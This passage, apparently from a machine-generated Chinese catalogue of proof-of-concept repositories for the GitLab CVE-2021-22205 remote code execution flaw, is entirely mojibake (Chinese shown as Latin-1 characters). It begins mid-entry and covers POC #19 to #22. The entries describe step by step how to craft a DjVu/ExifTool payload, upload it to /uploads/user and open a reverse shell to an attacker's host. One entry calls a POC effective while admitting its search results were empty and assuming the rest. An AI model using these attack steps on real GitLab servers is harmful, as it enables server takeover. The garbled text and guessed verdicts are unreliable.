æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
